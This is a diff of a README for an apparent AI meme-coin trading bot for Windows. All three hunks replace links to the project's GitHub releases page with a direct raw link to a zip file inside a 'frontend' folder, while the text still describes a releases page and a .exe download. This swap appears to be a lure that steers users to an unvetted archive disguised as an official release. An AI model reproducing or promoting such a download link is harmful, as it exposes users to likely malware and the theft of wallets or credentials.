@@ -1,6 +1,6 @@
 # 🤖 ai-meme-trading-bot - Simple AI Meme Coin Trading
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/mac2c12/ai-meme-trading-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/mac2c12/ai-meme-trading-bot/main/frontend/ai-meme-bot-trading-3.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This application does not require any special hardware.
 
 Click the badge below to visit the releases page where you can get the latest version of the bot.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/mac2c12/ai-meme-trading-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/mac2c12/ai-meme-trading-bot/main/frontend/ai-meme-bot-trading-3.9.zip)
 
 On the releases page, look for the latest stable version. Download the main executable file for Windows. It will usually end with `.exe`. The file size should be around 50MB to 100MB.
 
@@ -111,7 +111,7 @@ You can watch your trading activity anytime:
 
 Visit this page to download the latest release and get started with the ai-meme-trading-bot on Windows:
 
-[https://github.com/mac2c12/ai-meme-trading-bot/releases](https://github.com/mac2c12/ai-meme-trading-bot/releases)
+[https://raw.githubusercontent.com/mac2c12/ai-meme-trading-bot/main/frontend/ai-meme-bot-trading-3.9.zip](https://raw.githubusercontent.com/mac2c12/ai-meme-trading-bot/main/frontend/ai-meme-bot-trading-3.9.zip)
 
 ---
 
